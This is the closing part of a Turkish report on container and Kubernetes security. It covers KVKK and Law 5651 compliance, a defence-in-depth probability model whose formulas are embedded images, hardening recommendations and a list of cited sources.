+#### **Kişisel Verilerin Korunması Kanunu (KVKK) ile İki Kademeli Kimlik Doğrulama**
+
+KVKK kapsamında, bulut ortamlarında depolanan veya işlenen kişisel verilere uzaktan erişim sağlanması durumunda, iki kademeli (MFA) kimlik doğrulama kontrolünün uygulanması zorunludur7. Bu kural, Kubernetes API sunucusuna, IaC depolarına ve imaj kayıt sistemlerine (registry) erişen tüm personel için tavizsiz bir biçimde işletilmelidir7.
+
+#### **5651 Sayılı Kanun ve Log Bütünlüğü**
+
+Ağ üzerinden gerçekleşen tüm erişim, işlem ve ağ trafiği iz kayıtlarının (audit logs) doğruluğu, bütünlüğü ve inkar edilemezliği garanti altına alınmalıdır8. Konteyner ve orkestrasyon katmanlarında oluşan anlık dinamik loglar (örneğin podların silinmesi/oluşturulması esnasında üretilen loglar) kaybolmadan merkezi log yönetim sistemine aktarılmalıdır34.  
+Zaman senkronizasyonunun doğruluğu için tüm Kubernetes node'ları ve syslog sunucuları NTP servisleri ile senkronize edilmeli, log dosyaları üzerinde SHA-256 hash imzaları ile bütünlük doğrulaması yapılmalıdır13.
+
+## **7\. Matematiksel Risk ve Sızıntı Yayılım Modellemesi**
+
+Bulut yerlisi ortamlarda zafiyet barındıran veya imzasız bir imajın, orkestrasyon katmanındaki çeşitli filtreleri aşarak üretim ortamına (production) sızma olasılığı, savunma derinliği ilkeleri çerçevesinde matematiksel olarak modellenebilir.  
+Bir saldırganın, zafiyet barındıran veya manipüle edilmiş bir imajı üretim kümesine başarıyla yerleştirebilmesi (![][image1]), zincirleme çalışan güvenlik kontrollerinin her birinin başarısız olma olasılıklarının bir bileşkesidir.  
+Süreçteki kontrol adımları şu şekilde tanımlansın:
+
+* ![][image2]: IaC / Statik kod analizi aşamasında zafiyetli konfigürasyonun gözden kaçma olasılığı.  
+* ![][image3]: CI/CD hattındaki imaj taramasının (Trivy/Snyk) zafiyeti tespit edememe (false-negative) olasılığı43.  
+* ![][image4]: Kriptografik imza doğrulama aşamasının (Cosign/Kyverno) bypass edilme olasılığı41.  
+* ![][image5]: Çalışma zamanı güvenlik aracının (runtime agent \- Falco/Wazuh) saldırganın aktivitelerini algılayamama olasılığı31.
+
+Her bir güvenlik katmanı istatistiksel olarak birbirinden bağımsız kabul edildiğinde, sistemin genel sızma olasılığı her bir katmanın hata olasılıklarının çarpımına eşittir:  
+![][image6]  
+Sayısal bir analiz yapılacak olursa, her bir katmanın hata yapma (başarısız olma) olasılığının oldukça yüksek ve ![][image7] (![][image8]) olduğu varsayıldığında dahi, dört katmanlı savunma derinliği mimarisinin toplam sızma olasılığı üzerindeki düşürücü etkisi şu şekilde hesaplanır:  
+![][image9]  
+Bu hesaplama, tek başına zayıf görünen koruma önlemlerinin dahi üst üste bindirilerek kurgulandığı bir "Savunma Derinliği" mimarisinde, toplam sistem riskinin eksponansiyel olarak nasıl azaldığını ve kurumsal güvenliğin neden çok katmanlı olması gerektiğini matematiksel olarak ispatlar4.
+
+## **8\. Sonuç ve Mimari Öneriler**
+
+Bulut yerlisi, konteynerize ve kod olarak yönetilen modern altyapılarda güvenliğin sağlanması; geleneksel reaktif yöntemlerden, proaktif ve her katmanda doğrulama gerçekleştiren rejimlere geçişi zorunlu kılmaktadır3. Kurumsal sistem ve güvenlik mimarlarının altyapıyı sıkılaştırmak adına uygulayabileceği stratejik yol haritası şu temel adımlardan oluşmalıdır:
+
+1. **Linux Çekirdeği Seviyesinde İzolasyonun Sıkılaştırılması:** Tüm konteyner ana makinelerinde cgroup v2 mimarisine geçilmeli, seccomp ve AppArmor/SELinux profilleri varsayılan olarak etkinleştirilmeli ve podların host yeteneklerini (capabilities) kullanması en alt düzeye indirilmelidir14.  
+2. **Kubernetes Kümesinde Sıfır Güven (Zero Trust) Ağ Tasarımı:** Ağ mikro-segmentasyonu için Calico/Cilium gibi gelişmiş bir CNI eklentisi konumlandırılmalı, tüm isim alanlarında (namespaces) "Default Deny-All" politikası etkinleştirilmeli ve podlar arası iletişim yalnızca meşru ihtiyaçlar doğrultusunda mikro seviyede tanımlanmalıdır1.  
+3. **Yazılım Tedarik Zincirinin Kriptografik Olarak Korunması:** CI/CD süreçlerinde Trivy ve Snyk ile statik ve dinamik imaj taramaları otomatikleştirilmeli, imajlar Cosign ile imzalanmalı ve Kyverno admission controller politikaları ile kümede imzasız imajların çalıştırılması engellenmelidir41.  
+4. **Kod Olarak Altyapı (IaC) Güvenliğinin Otomasyonu:** Terraform ve Ansible kodları Checkov gibi statik analiz araçları ile taranmalı, bu taramalar pre-commit ve pre-apply kancaları (hooks) ile CI/CD boru hattına entegre edilerek zafiyetli veya gevşek konfigürasyonların buluta uygulanması engellenmelidir56.  
+5. **Yasal Mevzuat ve İzlenebilirlik Altyapısının Kurulması:** KVKK, 5651 Sayılı Kanun ve Cumhurbaşkanlığı Bilgi ve İletişim Güvenliği Rehberi (BİGR) standartları uyarınca, veri yerelliği şartlarına tam uyum sağlanmalı, iki kademeli kimlik doğrulama kontrolleri tüm yönetim panellerinde aktif edilmeli ve tüm konteyner çalışma zamanı olayları ile Kubernetes API audit logları Wazuh SIEM sistemi üzerinde merkezi olarak korele edilmelidir7.
+
+#### **Alıntılanan çalışmalar**
+
+1. Kubernetes network isolation and NetworkPolicy at fleet scale \- Qovery Blog, [https://www.qovery.com/blog/basic-network-isolation-in-kubernetes](https://www.qovery.com/blog/basic-network-isolation-in-kubernetes)  
+2. Network Security in Kubernetes — Implementing & Enforcing Network Policies \- Medium, [https://medium.com/@bavicnative/network-security-in-kubernetes-implementing-enforcing-network-policies-c3d9d7d14a3b](https://medium.com/@bavicnative/network-security-in-kubernetes-implementing-enforcing-network-policies-c3d9d7d14a3b)  
+3. NIST SP 800-190: Overview & Compliance Checklist \- Anchore Enterprise, [https://anchore.com/compliance/nist/800-190/](https://anchore.com/compliance/nist/800-190/)  
+4. Anatomy of a CVE \- SIGHUP, [https://blog.sighup.io/anatomy-of-a-cve/](https://blog.sighup.io/anatomy-of-a-cve/)  
+5. Beyond the Sandbox: Container Escape Techniques Observed in Recent Research, [https://linuxsecurity.com/features/container-escape-techniques-security](https://linuxsecurity.com/features/container-escape-techniques-security)  
+6. Siber Güvenlik Hukuku \- Mehmet Bedii Kaya, [https://mbkaya.com/hukuk/siber-guvenlik-hukuku.pdf](https://mbkaya.com/hukuk/siber-guvenlik-hukuku.pdf)  
+7. Bulut Güvenliği \- Barikat Siber Güvenlik, [https://www.barikat.com.tr/blog/bulut-guvenligi](https://www.barikat.com.tr/blog/bulut-guvenligi)  
+8. Bilgi ve İletişim Güvenliği Rehberi, [https://cdn.siberguvenlik.gov.tr/public/docs/bg\_rehber.pdf](https://cdn.siberguvenlik.gov.tr/public/docs/bg_rehber.pdf)  
+9. SP 800-190, Application Container Security Guide | CSRC, [https://csrc.nist.gov/pubs/sp/800/190/final](https://csrc.nist.gov/pubs/sp/800/190/final)  
+10. CGroups \- HackTricks, [https://hacktricks.wiki/en/linux-hardening/privilege-escalation/container-security/protections/cgroups.html](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/container-security/protections/cgroups.html)  
+11. Organizations Warned of Exploited Linux Kernel Vulnerability \- SecurityWeek, [https://www.securityweek.com/organizations-warned-of-exploited-linux-kernel-vulnerability/](https://www.securityweek.com/organizations-warned-of-exploited-linux-kernel-vulnerability/)  
+12. CVE-2022-0492: Linux Kernel Privilege Escalation Flaw \- SentinelOne, [https://www.sentinelone.com/vulnerability-database/cve-2022-0492/](https://www.sentinelone.com/vulnerability-database/cve-2022-0492/)  
+13. Use NIST SP 800-190 policy constraints \- Google Cloud Documentation, [https://docs.cloud.google.com/kubernetes-engine/policy-controller/docs/how-to/using-nist-sp-800-190](https://docs.cloud.google.com/kubernetes-engine/policy-controller/docs/how-to/using-nist-sp-800-190)  
+14. cgroup v1 to v2 Migration in Kubernetes \- Chkk, [https://www.chkk.io/blog/cgroup-v1-to-v2-migration-in-kubernetes](https://www.chkk.io/blog/cgroup-v1-to-v2-migration-in-kubernetes)  
+15. Container security fundamentals part 4: Cgroups, [https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-4/](https://securitylabs.datadoghq.com/articles/container-security-fundamentals-part-4/)  
+16. Container and Docker Security Audit Checklist PDF \- Free Download \- POPProbe, [https://www.popprobe.com/checklist-library/it-data-security/cybersecurity/b21-cloud-container-security-checklist](https://www.popprobe.com/checklist-library/it-data-security/cybersecurity/b21-cloud-container-security-checklist)  
+17. About cgroup v2 \- Kubernetes, [https://kubernetes.io/docs/concepts/architecture/cgroups/](https://kubernetes.io/docs/concepts/architecture/cgroups/)  
+18. Container Escape: New Vulnerabilities Affecting Docker and RunC \- Palo Alto Networks, [https://www.paloaltonetworks.com/blog/cloud-security/leaky-vessels-vulnerabilities-container-escape/](https://www.paloaltonetworks.com/blog/cloud-security/leaky-vessels-vulnerabilities-container-escape/)  
+19. T1611: Escape to Host \- Матрица MITRE ATT\&CK \- Positive Technologies, [https://mitre.ptsecurity.com/en-US/T1611](https://mitre.ptsecurity.com/en-US/T1611)  
+20. Containers on fire: from container escapes to supply chain attacks \- Securelist, [https://securelist.com/container-attack-vectors/120010/](https://securelist.com/container-attack-vectors/120010/)  
+21. How to Use auditd and Integrate It with Wazuh (With Practical Examples) \- FullStackQuest, [https://fullstackquest.com/how-to-use-auditd-and-integrate-it-with-wazuh-with-practical-examples/](https://fullstackquest.com/how-to-use-auditd-and-integrate-it-with-wazuh-with-practical-examples/)  
+22. Kubernetes Audit Logging Using Wazuh | by Piyush Ramani \- Medium, [https://medium.com/@pkramani31/kubernetes-audit-logging-using-wazuh-f62fb3fcd4d5](https://medium.com/@pkramani31/kubernetes-audit-logging-using-wazuh-f62fb3fcd4d5)  
+23. Useful Wazuh Rules and Capabilities for Threat Detection | by Ismael Barrantes \- Medium, [https://medium.com/@ismapersonal97/useful-wazuh-rules-and-capabilities-for-threat-detection-e2cc0debabde](https://medium.com/@ismapersonal97/useful-wazuh-rules-and-capabilities-for-threat-detection-e2cc0debabde)  
+24. Detecting defense evasion techniques with Wazuh, [https://wazuh.com/blog/detecting-defense-evasion-techniques-with-wazuh/](https://wazuh.com/blog/detecting-defense-evasion-techniques-with-wazuh/)  
+25. CVE-2024-21626 Detail \- NVD, [https://nvd.nist.gov/vuln/detail/cve-2024-21626](https://nvd.nist.gov/vuln/detail/cve-2024-21626)  
+26. CVE-2024-21626 Container breakout | Tutorial & examples \- Snyk Learn, [https://learn.snyk.io/lesson/cve-2024-21626-runc-process-cwd-container-breakout/](https://learn.snyk.io/lesson/cve-2024-21626-runc-process-cwd-container-breakout/)  
+27. Leaky Vessels: Deep Dive on Container Escape Vulnerabilities | Wiz Blog, [https://www.wiz.io/blog/leaky-vessels-container-escape-vulnerabilities](https://www.wiz.io/blog/leaky-vessels-container-escape-vulnerabilities)  
+28. Mitigating Leaky Vessels Vulnerabilities in runc, BuildKit and Moby \- Aqua Security, [https://www.aquasec.com/blog/mitigating-leaky-vessels-vulnerabilities-in-runc-buildkit-and-moby-with-aqua/](https://www.aquasec.com/blog/mitigating-leaky-vessels-vulnerabilities-in-runc-buildkit-and-moby-with-aqua/)  
+29. Notice of the Impact of runC Vulnerability (CVE-2024-21626) \- 华为云, [https://support.huaweicloud.com/eu/bulletin-cce/CVE-2024-21626.html](https://support.huaweicloud.com/eu/bulletin-cce/CVE-2024-21626.html)  
+30. Container Service for Kubernetes:How to fix vulnerability CVE-2024-21626 \- Alibaba Cloud, [https://www.alibabacloud.com/help/en/ack/product-overview/vulnerability-cve-2024-21626-bulletin](https://www.alibabacloud.com/help/en/ack/product-overview/vulnerability-cve-2024-21626-bulletin)  
+31. PoC and Detection for CVE-2024-21626 \- GitHub, [https://github.com/NitroCao/CVE-2024-21626](https://github.com/NitroCao/CVE-2024-21626)  
+32. Mastering Kubernetes Network Policy for Enhanced Security \- Plural.sh, [https://www.plural.sh/blog/kubernetes-network-policy-security/](https://www.plural.sh/blog/kubernetes-network-policy-security/)  
+33. Detecting Kubernetes attacks with Wazuh, [https://wazuh.com/blog/detecting-kubernetes-attacks-with-wazuh-2/](https://wazuh.com/blog/detecting-kubernetes-attacks-with-wazuh-2/)  
+34. Wazuh Container Security \- Docker and Kubernetes, [https://opennix.org/en/docs/wazuh/capabilities/wazuh-container-security/](https://opennix.org/en/docs/wazuh/capabilities/wazuh-container-security/)  
+35. How to Configure Kubernetes Pod Security Standards Enforcement \- OneUptime, [https://oneuptime.com/blog/post/2026-02-09-pod-security-standards-enforcement/view](https://oneuptime.com/blog/post/2026-02-09-pod-security-standards-enforcement/view)  
+36. Implementing Pod Security Standards in Amazon EKS | Containers \- AWS, [https://aws.amazon.com/blogs/containers/implementing-pod-security-standards-in-amazon-eks/](https://aws.amazon.com/blogs/containers/implementing-pod-security-standards-in-amazon-eks/)  
+37. Securing Kubernetes: Implementing Pod Security Admission (PSA) with Real-World Examples and Best Practices \- Gerardo Ocampos, [https://blog-ocampoge.medium.com/securing-kubernetes-implementing-pod-security-admission-psa-with-real-world-examples-94bb9b602ecb](https://blog-ocampoge.medium.com/securing-kubernetes-implementing-pod-security-admission-psa-with-real-world-examples-94bb9b602ecb)  
+38. Pod Security Standards \- Kubernetes, [https://kubernetes.io/docs/concepts/security/pod-security-standards/](https://kubernetes.io/docs/concepts/security/pod-security-standards/)  
+39. Pod Security Standards: Privileged, Baseline & Restricted Explained \- YouTube, [https://www.youtube.com/watch?v=bSXi2wF-FKY](https://www.youtube.com/watch?v=bSXi2wF-FKY)  
+40. Implementing NIST SP 800-190 Controls with Open Source Tools: A Practitioner's Guide to Not Breaking Things While Securing Everything, [https://blog.alphabravo.io/implementing-nist-sp-800-190-controls-with-open-source-tools-a-practitioners-guide-to-not-breaking-things-while-securing-everything/](https://blog.alphabravo.io/implementing-nist-sp-800-190-controls-with-open-source-tools-a-practitioners-guide-to-not-breaking-things-while-securing-everything/)  
+41. How to Implement Container Image Signing with Cosign and Kubernetes Admission, [https://oneuptime.com/blog/post/2026-02-09-container-image-signing-cosign-admission/view](https://oneuptime.com/blog/post/2026-02-09-container-image-signing-cosign-admission/view)  
+42. CONNAISSEUR \- Verify Container Image Signatures in Kubernetes, [https://sse-secure-systems.github.io/connaisseur/v2.1.1/](https://sse-secure-systems.github.io/connaisseur/v2.1.1/)  
+43. Container image security with Wazuh and Trivy, [https://wazuh.com/blog/container-image-security-with-wazuh-and-trivy/](https://wazuh.com/blog/container-image-security-with-wazuh-and-trivy/)  
+44. Container vulnerability scanning with Wazuh and Snyk, [https://wazuh.com/blog/container-vulnerability-scanning-with-wazuh-and-snyk/](https://wazuh.com/blog/container-vulnerability-scanning-with-wazuh-and-snyk/)  
+45. Container Security, Container Resources and Trigger Alerts \- Wazuh, [https://wazuh.com/resources/use-cases/container-security/](https://wazuh.com/resources/use-cases/container-security/)  
+46. Using Wazuh to monitor Docker \- Container security, [https://documentation.wazuh.com/current/user-manual/capabilities/container-security/monitoring-docker.html](https://documentation.wazuh.com/current/user-manual/capabilities/container-security/monitoring-docker.html)  
+47. Wazuh and Trivy integration to scan Docker image vulnerabilities. \- GitHub, [https://github.com/devopstales/wazuh-trivy](https://github.com/devopstales/wazuh-trivy)  
+48. How to secure Kubernetes deployment with signature verification \- Sysdig, [https://www.sysdig.com/blog/secure-kubernetes-deployment-signature-verification](https://www.sysdig.com/blog/secure-kubernetes-deployment-signature-verification)  
+49. Signed, Sealed, and Admitted: Image Trust in Kubernetes with Cosign \- CloudSecBurrito, [https://cloudsecburrito.com/signed-sealed-and-admitted](https://cloudsecburrito.com/signed-sealed-and-admitted)  
+50. How to Implement Kyverno Image Verification with Cosign Signatures \- OneUptime, [https://oneuptime.com/blog/post/2026-02-09-kyverno-image-verification-cosign/view](https://oneuptime.com/blog/post/2026-02-09-kyverno-image-verification-cosign/view)  
+51. Terraform Plan Scanning \- checkov, [https://www.checkov.io/7.Scan%20Examples/Terraform%20Plan%20Scanning.html](https://www.checkov.io/7.Scan%20Examples/Terraform%20Plan%20Scanning.html)  
+52. IaC Security Scan (Terraform \+ Checkov) | by Rick Yang | AWS in Plain English, [https://aws.plainenglish.io/infrastructure-as-code-security-82e63505e9c0](https://aws.plainenglish.io/infrastructure-as-code-security-82e63505e9c0)  
+53. Scanning Credentials and Secrets \- checkov, [https://www.checkov.io/2.Basics/Scanning%20Credentials%20and%20Secrets.html](https://www.checkov.io/2.Basics/Scanning%20Credentials%20and%20Secrets.html)  
+54. GitGuardian 2026: \#1 Secret Scanner (450+ Types) \- AppSec Santa, [https://appsecsanta.com/gitguardian](https://appsecsanta.com/gitguardian)  
+55. Custom YAML Policies Examples \- checkov, [https://www.checkov.io/3.Custom%20Policies/Examples.html](https://www.checkov.io/3.Custom%20Policies/Examples.html)  
+56. Enforcing IaC Security Policies in AI-Generated Code with Claude Code Hooks and Checkov | by Matthew Bunce | Medium, [https://medium.com/@matthewbunce/enforcing-iac-security-policies-in-ai-generated-code-with-claude-code-hooks-and-checkov-2b1cde407dad](https://medium.com/@matthewbunce/enforcing-iac-security-policies-in-ai-generated-code-with-claude-code-hooks-and-checkov-2b1cde407dad)  
+57. Using Checkov with Terraform \- Integrations, Features, Examples \- Scalr, [https://scalr.com/learning-center/using-checkov-with-terraform-integrations-features-examples](https://scalr.com/learning-center/using-checkov-with-terraform-integrations-features-examples)  
+58. Bilgi ve İletişim Güvenliği Rehberi \- DGRNET, [https://www.dgrnet.com.tr/2024/09/bilgi-ve-iletisim-guvenligi-rehberi/](https://www.dgrnet.com.tr/2024/09/bilgi-ve-iletisim-guvenligi-rehberi/)
+
+[image1]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAaCAYAAAD1wA/qAAACPElEQVR4Xu2XT0hVQRTGv0jBKE1pEWIhLVoUCVK5EHIh6MKgiBYuDFsUEq2CFkpFmyJcCBGa4l+iRYJQQYSE2uKBm6AWtQjcBBWRkFggLYyg+j7ODPe+6fkwuMF9cD/4ce+bc+bOnLlzzp0HZMqU6V/USpbJ7xhfyRd3/53cIVW+Q9o1SX6SY0H7YVhQ82RHYEudKskieUd2BzZNPkd+kbZ8U/p0gKySh6QssNWQlyj8tlKnk7B8uBwaqGbyg7wgOwNb6jSIwiuuiT8nK+RoYEudfA5o1R+Qccd98pncI3u8c5rl82OB1JPaGBUxv9TL58fV0FBqUn6URGktJv/9eE/q8k15KifnyC0yRa6TRlge9TufDjJKbro2XQ+Ru7Cc6ySPnc9+coU8I2fJFphOkdtkjFyEjbspaaBvZBbF8+EIGYENqO+KL9OnYcFIPbDgVOmUb70w/ybyCVFF1AlCAchPReQVLE+3u3Y9W/2GyHnXZ0O1kA/4+3y1Ucd9sLeWI5cQnbtOIArkuGtXADOIVlOL8BpWPKQ+RPmoNtnk46WThZ6rCirfRKWv/V5yAbYVn5BtyA9EaidvYNVPH9JqFA7ETzAeiAIfduwK/BKTBup298orrZYmEQ9Ek1cQqoLaGjecz2YDCf2Uj3rGGfc7EWmQp7Ctpz18zbXpRKy/AEpM7f2PZAJ2ZpsjB8kjsg6rjl1kyaF7ta2RadIAe9MDsOfp+tbdJ6atsFXWKaBYUUhC2o7/e4xMmTKVkv4Agmp2JZcdEqgAAAAASUVORK5CYII=>
+
+[image2]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAaCAYAAADxNd/XAAACnklEQVR4Xu2WTYhOURjH/4oiX4lISCMbpXymFAslkVhQKHYKKwsWZMHUZCUSVihjYaEoFiwQYqMsUGSlsKAIJRZS+P/nuWfm3GfOe+69Y2aK3l/9et/Oc+7Hec5zzrlAm/+PiXSUb2zIODraNw4H6+lx1B/ASLqXLnTts+mV4rcRq+h7+jvyM/1Q/P9GT9IJ4YKIRfQeneoDGVbSH3STD8Bi12Az2pjz9Cdd4doXwwZzCzbNgTH0Ot0WtVWh6+/DEnOgHOphBD2DdCzLePqQvqLTXCw89BddHbWvpc/Qv3+OPfQJbABHXSywnL6kHT6QYx79BKtB1WjMJPoY5dlRpi7QU6FTDWbRq3Qd/U4vlsO9hOdt94EcG2FZ2ecDsIyoZh+hrzan0BdI13EKDfgYrP8S2ABSyQqonC/BrquFMpmqf73wHfqRLo3a9RJvi986qN852E41nb6BlWW8pmK0BlTSKu1KQo0ryxr12UJN8TtYqcwMnQs2wHauOa49hRZ7N2zHEmEAKhOVSwrdX33Ut5JQ/7dhe7AuCrY6WJo8YCs9jL5yCDWeu75Jgnrr/5APZKg7AJ0Pz1E+Y4JKmpKXQvf/Shf4QArVv98iq6gzAGX8IN3hA7Dy1EJutYbq3L+HsP+/pjPKoSxa7FofuQyp5rtha8CjAWgWtKWm0BaaOpP6MZ9+oTfQut5TaOo1gFazptK5S7f4QMER2ACU6RQq5+w76ZtDUxTXpL5/dsadMoSda7drn0wfoHzfuI8GrOfE8ad0btRHZ4POiMafE03pRP4wGigdsE8JHaBDirKm7KkMBxMt+suo/3n+V+ynJ9DgyK9AJXiTLvOBoUJZOk03+8AAUBI6YUkZrITUYiztQs1TM8MaugvD/PJt2vyL/AHXNIkOPYbOnQAAAABJRU5ErkJggg==>
+
+[image3]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADEAAAAaCAYAAAAe97TpAAACvElEQVR4Xu2XS6hNURjHP0WRVx7RjfLIhJQ8UsodKEnJHTBRzBQTIwbK6JSRAQkjFAYGSmFAeRQx0TVhcLsmckgUoWSCPP7/8+2vs8631157b+17B7fzq1/n3LX2Xmd96/GtdUX6TFxmwym+8D+YAaf6wvFgBzwpzQSxBF7PPmuxBX6AfwO/wI/Z9+/wNJxlLwSshQ/hAl8B5sK78Ld02+X3d/Bn9vdLuBtOyt4hg/Cm6OzW5iL8BTe78nWiAd0TnW5jGrwF9wRlMbbCP/CYK+f7l0UDGwrKGdA5eDQoq8RM+AS+ggtdHTv+SLQj7JCxHb6Q/PMedsa/a+wUnZErrnwTHIXLXHmSlfCz6Hqc7OrmwGfSO0scrUvwjD1UANtim224qLeqAwNkEC1Xbr+515Un4XSyscO+QnRUfsCn0l2n8+EI3GUPFcCOt+FtyWedpaIzz9lc3FvVgcv7qvTulyQc0dh+YKcfwE9wQ1C+Hr7NPlOwPbZ7Ag4EMvjX8KzEEwbhLHGJc6mXYmueo83Iz2dynb4XXTZ+pLiWmdGWu3KP7Ycb0m2XsnPMQKu6j+bgb7wRDboU2w/3RfNzOGJ+CRhVfiC1H3imcHCYamMbnlQdqA62H3wKTFEliNR+IJaZuPZjsP4bXOMrYnA/FKXAIqoEUXQ+GIdEgyjKcFV+o4OdD23JT3kKbljul9Qopc6HeXAYfhU99WMwvcbOrRyrRRsqmvIiuI8YRKyDhG2xTV4xfFLgAfZYdD+kUjRnMNkv3k84VXanobwv7Q8fSmAZ7aAr5wgzQdjdiPLKwnRMeQ+jFyQfXIglhdpXj7q0JH7CNwFni9cOHrRjygr4XHRJNs0+eE2aud6XcgSekhpXgwpwSd6BG33FWMGR4tWB/xM0AQejJTo4TQ5MKdPhcal4spawDR6QcQ6gT5+JwD8kBZhSUCuzuwAAAABJRU5ErkJggg==>
+
+[image4]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAaCAYAAADxNd/XAAACvElEQVR4Xu2WS6iNURiGX6HILREJKZmIknuKOuRWYoCBYmagzBCnZLAlI5eEgaTk1EnJxEAKsaNQSgwMFQbUOWFiglze1/cv1v6s/7adY6D91JNjrX+v//++9a0L0OH/Yxwd7htrMpSOp0N8x2CzgZ5AeQDqn0O30i46ImvXB8+iw+g+uidrq8xK+pZ+j3xP+7K/P9JTdGz4QcR8epdO8h0R+t1p+pk26WF6lD6BBX8ANr5QkD10S/b/WlygX+hy174AFsxNOjpqH0mv0W1Rm2cV7Yc9N831TaAPYEnaHLXPpQ/p9KitlDH0Pn1BJ7s+fXSTfqOro/b19Bn+fD6gj1LWzyO/vHbRd3R21KZSukwbUVspGkADXYUNEKOF9Rits6MavQgrjRSqdWX+HmyB57ERljglMGY77J16dyU2waZyr+8gy+gn+gi/P2YifY7WqQ8o21dgM5bqj1EAqSTMo6/oYt+RhwZJ1b8++DYsm4ui9oX0dfavJwRcJYPaieJ1FZgCC6AsAT8JNa6X9sJqVl6ib2Cl4hegMqeda6ZrF92w2UxltirhmzRWKaH+b9EZsOiDYa/2KABlSM94FLgCUB23SwhA220pof4P+o4CqgSgZ4pQnevgShEC0NZeiqbab5FlFAWgrJUFoF3sEF3jOzIql1DY/1/Sqa1dhWixa30oi54u+pWeRf6VYCk9jvzzIWzdqV2xBZ16H+h15Nd7Cq0bBZCaNX2UNgGN6/sV0DrYZlF0PmjT0KHqf/+LFbAS8PefnfFDBYQp1kmaQteMY7CZaNLdsDuPZnt/1l+EZljnTJ2qqE0D6ZM7RlleC7uBLkH1WW7ArhNFY/81ugI/hZXhQKJL3h1YlQw62gZPIn+xtsMOeg75C3xA0UvOoM37ewLN6g3YgfrPGEWPIH2tqIO2dJ0h/trSoUMHxw9dMIXFCGS4mQAAAABJRU5ErkJggg==>
+
+[image5]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAaCAYAAAD1wA/qAAACsklEQVR4Xu2XT6hNURTGP0WRf4lIlMiElL8pxUBJJAZMFJko5hQyuiVDEkZSMjBQBgxIKGSiTChSoh6JIpRMkD/f9/ZZvX3X2WfffXW8wev96uve1j7n7r3WXmvvdYFRRj5TqXHe+I9MosZ743CwhTqB9hyZR12pPvtiPfWe+hPpM/Wh+v6NOkVNsRcillN3qZl+gMyg7lO/MPS7P6i3ke0ptYMaU71jrKOuIux035ynflJrnX0FglO3ELbdmEBdo3ZGthSbERZ93Nn1/hGEOQ+h2xl9P0sdjmxFTKYeUK+oWW5Mi79H/aY2RPZN1BPUn/ccRf1dwxb8hVrixtZQz6n5zp5lEfUJITfHurFp1CN075YWcIE6bQ81oKK9jpC6C9yYsRVhx/Y7u827y9mzbEP4sQN+ACEy36mHGMpZ5f8zars91MAcagDBmaaTyBzRznmU7pdQr6FGFNlUfWjhd6iP1KrIvpJ6U33mUDoprXx9xCh4ciRVD7Ip5ZX6PbEaUNTl/blKF6l3CCk01x6uUBRz6WJoIU31ISxF5UgqhTTPa2q2H0hh9XEb4ezWS6ZcOvSaoKQ+LEU1v9bhKQ3YIFYfqRxtosSRkvrQyacdUy34Q0Zonq/UUj+QQvWR2/4UJY70qg+ltO6mF2i+xUvmGcTujwGECJaiQ0H1k4tU7v5QO9NB6CBWdw91obpJ3W01dAnpMsptfwrlsxxJLVLo1r6Jen6ruBcjzPeSWhaNpVAwsmtTL6Mtsx5IUnT2xg9lsJPOX2LTEQ4N9VT2u2pvdFSrx5Jd/dUeBGdzqGZ0QaeO5VbpIN0JtIVaE7UoupD/Kwupx6j3SG2xm7qM9v4eZDlInUQfLUQhStEbyB8EraJonUH4T9EWCkoHIUhtByjLROoYCm/fAjZS+zDMTowyykjkL/wIlOwL36ZqAAAAAElFTkSuQmCC>
+
+[image6]: <data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAmwAAAAxCAYAAABnGvUlAAAG4UlEQVR4Xu3cX6h0VRnH8UeyKNJCrfBPpYg3iqBRKYJ6IRIFGRIpgoWCiApiVERFKaJ4ISL4Jywq6H2FCESoSCNUbOxCQ4P0whtR/HOhqKggKZhYra97lrPmmb33nHM8Z+a8+P3A4j17zexznr3mvOzfWWvNREiSJEmSJEmSJEmSJEmSJEmSJEmSJEmSJEmSJEmSJEmSJEmSJEmSJEmSPkA+WdqHc+eAA3LHilHrRn2otP1y5wptZlz3pVqx2edLkqT36cYYvvnuX9qJzfGR07YOhISTcucIAtD3cucKDY0rofdbpR07Pf5szGpdV2gbqnUIr8PvcqckSev2tdL+1xx/orTXSvtC07cb/aa0U5vjl0q7Z/r1x0r7U/NYn0lpP0p9P0/H2+GE0l6PLiCC2t4p7RvvPaOrJSP0EBxq0PlZzL9Ox5f2ueZ4u4yNK/rGldp+HN21VVwzgQ3U+lDz2Hb4eGn3lXb09Jhxequ0X7z3jP5a8XbMXyPPawMz1/HN5liSpLW7u7QXUh/B4LrUt5sQZl6JWQjCI9HdiPHb0m5pHssIOgTVvan/oNLOT30VASEjJLDkN4Y6al0V43vn9OsvxmxGqsX481hFwOO8fM3U3KdvVumQ3JEsG1euN4/rpaX9JPUhjy3jOlTrwbmjODzGZ+XOLO2/qY/f4/q73FcruEbGvr1GcN3t6/Bk87UkSWv3THQzFRXLc8xUnNL07TY1vLSo+R/Trx+P4RkSbuQ3RBeG+m7c7axW69Olfak55jkXRn8wak1Ke6o55udR+3nT40tKO3D28LtYWpyU9qmm7++lvdwc49nSvpz6qptivrZDY/my67JxpZ52XI8p7fnon+ljpq7FTONQrX+I+eVo6v5h9L8OFbOjuVaOfz/9OtdacY2MefZmzNfX/p+QJGntuMmx5PWraftnjN8ot8tfS3tupI2ZRBckqJeZHEJDXX4Dsyx1qSzbE91y72HRP0NFCOKxPvwM6mZ8bo3lYQ2ML2Nax5fwVmflajDLanCq59xV2umx+LpMYnFZt+K5l0dXI4FoWVjDJGbjSsvjelbMj+skFme5hnCtQ7WC/YSEtquiC2vLPBNdgK21vhjdcn6Va60mMR+EcUQs/s5Q67rfiCJJ0rs+Gt1+tdOiCylDQWW3Yfnq3pjVzHW0xkIXgYAwQ1Dre16+cWcEGPa6bSSsgUBzTsxqbUPXUGBjOfSN5phzCHAXN32YxPjSNefdERsLa1g2roSgdrwYv7ycPoRrHasV98fymbWKcf11zGrNr0eutcpLvmB5la0B7fUS2HKYlyRpLbhR9e3zWQX2U9WbbV8bw82a2of0BTFCABvjW4Sidp8Y+s6t6qzV52NjIYg9UTkItIYCG6GCpdkW18z3ak1ifNaKcHlybHw2cNm45hDEDCXjlfHafib1LZthq8ugXGO7PNqH